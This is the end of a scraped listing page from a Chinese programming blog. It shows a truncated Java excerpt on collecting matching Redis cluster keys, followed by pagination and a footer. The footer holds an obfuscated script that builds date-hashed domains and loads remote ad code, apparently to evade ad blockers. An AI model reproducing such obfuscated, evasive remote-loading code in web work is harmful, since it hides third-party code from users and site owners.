/** * 搜索集群内匹配的Key * * @param pattern 匹配规则,该参数和Jedis keys(pattern)方法相同。 * eg:搜索Node_status_开头的所有key，该参数填Node_status_* * @return 集群内所有符合规则的Key列表 */ public Set&lt;String&gt; clusterKeys(String pattern)throws DataLoadException{ Set&lt;String&gt; result = new HashSet&lt;&gt;(); try { // 获取Redis集群内所有节点 Map&lt;String, JedisPool&gt; clusterNodes = jedisCluster.getClusterNodes(); for (Map.Entry&lt;String, JedisPool&gt; entry : clusterNodes.entrySet()) { Jedis jedis = entry.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9c8362d0ad3044440b1ed4e22449561d/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/503/">«</a>
	<span class="pagination__item pagination__item--current">504/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/505/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>